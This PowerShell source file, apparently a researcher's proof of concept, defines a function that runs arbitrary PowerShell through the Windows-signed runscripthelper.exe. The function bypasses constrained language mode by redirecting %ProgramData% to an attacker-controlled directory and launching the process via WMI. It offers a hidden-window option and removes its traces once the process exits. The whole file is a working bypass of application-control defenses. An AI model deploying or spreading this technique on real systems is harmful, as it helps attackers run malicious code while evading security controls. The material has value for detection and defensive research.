function Invoke-RunScriptHelperExpression {
<#
.SYNOPSIS

Executes PowerShell code in full language mode in the context of runscripthelper.exe.

.DESCRIPTION

Invoke-RunScriptHelperExpression executes PowerShell code in the context of runscripthelper.exe - a Windows-signed PowerShell host application which appears to be used for telemetry collection purposes. The PowerShell code supplied will run in FullLanguage mode and bypass constrained language mode.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause

.PARAMETER ScriptBlock

Specifies the PowerShell code to execute in the context of runscripthelper.exe

.PARAMETER RootDirectory

Specifies the root directory where the "Microsoft\Diagnosis\scripts" directory structure will be created. -RootDirectory defaults to the current directory.

.PARAMETER ScriptFileName

Specifies the name of the PowerShell script to be executed. The script file can be any file extension. -ScriptFileName defaults to test.txt.

.PARAMETER HideWindow

Because Invoke-RunScriptHelperExpression launches a child process in a new window (due to how Win32_Process.Create works), -HideWindow launches a hidden window.

.EXAMPLE

$Payload = {
    # Since this is running inside a console app,
    # you need the Console class to write to the screen.
    [Console]::WriteLine('Hello, world!')
    $LanguageMode = $ExecutionContext.SessionState.LanguageMode
    [Console]::WriteLine("My current language mode: $LanguageMode")
    # Trick to keep the console window up
    $null = [Console]::ReadKey()
}

Invoke-RunScriptHelperExpression -ScriptBlock $Payload

.OUTPUTS

System.Diagnostics.Process

Outputs a process object for runscripthelper.exe. This is useful if it later needs to be killed manually with Stop-Process.
#>

    [CmdletBinding()]
    [OutputType([System.Diagnostics.Process])]
    param (
        [Parameter(Mandatory = $True)]
        [ScriptBlock]
        $ScriptBlock,

        [String]
        [ValidateNotNullOrEmpty()]
        $RootDirectory = $PWD,

        [String]
        [ValidateNotNullOrEmpty()]
        $ScriptFileName = 'test.txt',

        [Switch]
        $HideWindow
    )

    $RunscriptHelperPath = "$Env:windir\System32\runscripthelper.exe"

    # Validate that runscripthelper.exe is present
    $null = Get-Item -Path $RunscriptHelperPath -ErrorAction Stop

    # Optional: Since not all systems will have runscripthelper.exe, you could compress and
    # encode the binary here and then drop it. That's up to you. This is just a PoC.

    $ScriptDirFullPath = Join-Path -Path (Resolve-Path -Path $RootDirectory) -ChildPath 'Microsoft\Diagnosis\scripts'

    Write-Verbose "Script will be saved to: $ScriptDirFullPath"

    # Create the directory path expected by runscripthelper.exe
    if (-not (Test-Path -Path $ScriptDirFullPath)) {
        $ScriptDir = mkdir -Path $ScriptDirFullPath -ErrorAction Stop
    } else {
        $ScriptDir = Get-Item -Path $ScriptDirFullPath -ErrorAction Stop
    }

    $ScriptFullPath = "$ScriptDirFullPath\$ScriptFileName"

    # Write the payload to disk - a requirement of runscripthelper.exe
    Out-File -InputObject $ScriptBlock.ToString() -FilePath $ScriptFullPath -Force

    $CustomProgramFiles = "ProgramData=$(Resolve-Path -Path $RootDirectory)"
    Write-Verbose "Using the following for %ProgramData%: $CustomProgramFiles"

    # Gather up all existing environment variables except %ProgramData%. We're going to supply our own, attacker controlled path.
    [String[]] $AllEnvVarsExceptLockdownPolicy = Get-ChildItem Env:\* -Exclude 'ProgramData' | % { "$($_.Name)=$($_.Value)" }
    
    # Attacker-controlled %ProgramData% being passed to the child process.
    $AllEnvVarsExceptLockdownPolicy += $CustomProgramFiles

    # These are all the environment variables that will be explicitly passed on to runscripthelper.exe
    $StartParamProperties = @{ EnvironmentVariables = $AllEnvVarsExceptLockdownPolicy }

    $Hidden = [UInt16] 0
    if ($HideWindow) { $StartParamProperties['ShowWindow'] = $Hidden }

    $StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

    $RunscriptHelperCmdline = "$RunscriptHelperPath surfacecheck \\?\$ScriptFullPath $ScriptDirFullPath"
    Write-Verbose "Invoking the following command: $RunscriptHelperCmdline"

    # Give runscripthelper.exe what it needs to execute our malicious PowerShell.
    $Result = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
        CommandLine = $RunscriptHelperCmdline
        ProcessStartupInformation = $StartParams
    }

    if ($Result.ReturnValue -ne 0) {
        throw "Failed to start runscripthelper.exe"
        return
    }

    $Process = Get-Process -Id $Result.ProcessId

    $Process

    # When runscripthelper.exe exits, clean up the script and the directories.
    # I'm using proper eventing here because if you immediately delete the script from
    # disk then it will be gone before runscripthelper.exe has an opportunity to execute it.
    $Event = Register-ObjectEvent -InputObject $Process -EventName Exited -SourceIdentifier 'RunscripthelperStopped' -MessageData "$RootDirectory\Microsoft" -Action {
        Remove-Item -Path $Event.MessageData -Recurse -Force
        Unregister-Event -SourceIdentifier $EventSubscriber.SourceIdentifier
    }
}